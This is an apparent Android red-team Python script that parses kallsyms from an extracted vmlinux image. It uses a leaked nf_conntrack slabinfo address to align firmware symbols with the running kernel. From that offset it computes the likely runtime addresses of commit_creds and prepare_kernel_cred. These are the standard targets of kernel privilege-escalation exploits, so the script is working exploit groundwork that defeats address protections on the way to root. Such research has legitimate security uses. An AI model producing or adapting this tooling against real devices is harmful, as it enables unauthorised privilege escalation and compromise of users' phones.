#!/usr/bin/env python3
"""Calibrate firmware->running kernel offset using nf_conntrack slabinfo leak."""
import struct

with open(r'C:\InfoSec\android-redteam\work\vmlinux_aqgf', 'rb') as f:
    data = f.read()

# Offsets
TABLE_START = 0x87A550
NUM_SYMS = 43664
NAMES_OFF = 0x8A4F94
TOKEN_TABLE_OFF = 0x926000

# Parse tokens
tokens = []
pos = TOKEN_TABLE_OFF
for i in range(256):
    end = data.index(b'\x00', pos)
    tokens.append(data[pos:end].decode('ascii', errors='replace'))
    pos = end + 1

def decode_name(compressed_bytes):
    result = ''
    for b in compressed_bytes:
        result += tokens[b]
    return result

# Search for nf_conntrack related symbols
print("Searching for nf_conntrack symbols in firmware:")
pos = NAMES_OFF
for i in range(NUM_SYMS):
    entry_len = data[pos]
    entry_data = data[pos+1:pos+1+entry_len]
    pos += 1 + entry_len
    
    if entry_len > 0:
        sym_name = decode_name(entry_data[1:])
        addr = struct.unpack_from('<I', data, TABLE_START + i * 4)[0]
        
        if 'nf_conntrack' in sym_name and 0xc0af0000 <= addr <= 0xc0b00000:
            sym_type = decode_name(entry_data[0:1])
            print(f"  [{i}] 0x{addr:08x} {sym_type} {sym_name}")

# Running kernel has nf_conntrack_c0afeb00 in slabinfo
# This means some nf_conntrack function is at 0xc0afeb00 in the running kernel
# Let's find the matching firmware symbol

print("\nAll firmware symbols near 0xc0afeb00 (within +/- 0x2000):")
pos = NAMES_OFF
for i in range(NUM_SYMS):
    entry_len = data[pos]
    entry_data = data[pos+1:pos+1+entry_len]
    pos += 1 + entry_len
    
    if entry_len > 0:
        addr = struct.unpack_from('<I', data, TABLE_START + i * 4)[0]
        if 0xc0afc000 <= addr <= 0xc0b02000:
            sym_name = decode_name(entry_data[1:])
            sym_type = decode_name(entry_data[0:1])
            diff = addr - 0xc0afeb00
            print(f"  [{i}] 0x{addr:08x} ({diff:+5d}) {sym_type} {sym_name}")

# Also: compute offset for commit_creds area
# Known offsets (recovery traces vs firmware):
print("\n\nOffset analysis (firmware - running):")
pairs = [
    ('warn_slowpath_common', 0xc002a61c, 0xc002b000),
    ('warn_slowpath_null', 0xc002a740, 0xc002b3b8),
    ('kernel_init', 0xc07d4fa0, 0xc07d5724),
    ('do_one_initcall', 0xc0a28b50, 0xc0a292e4),
]
for name, running, fw in pairs:
    diff = fw - running
    pct = diff / running * 100
    print(f"  {name}: running=0x{running:08x} fw=0x{fw:08x} diff={diff:+d} bytes")

# The cred functions are at ~0xc0054XXX in firmware
# Apply average offset from nearby known functions
# commit_creds in firmware: 0xc0054328
# The offset increases with address. For the 0xc005XXXX range, extrapolate:
avg_early_offset = (2532 + 3192) / 2  # ~2862 for 0xc002XXXX area
print(f"\nEstimated offset for cred area: ~{avg_early_offset:.0f} bytes")
print(f"commit_creds firmware: 0xc0054328")
print(f"commit_creds estimated running: 0x{0xc0054328 - int(avg_early_offset):08x}")
print(f"prepare_kernel_cred firmware: 0xc00548e0")
print(f"prepare_kernel_cred estimated running: 0x{0xc00548e0 - int(avg_early_offset):08x}")
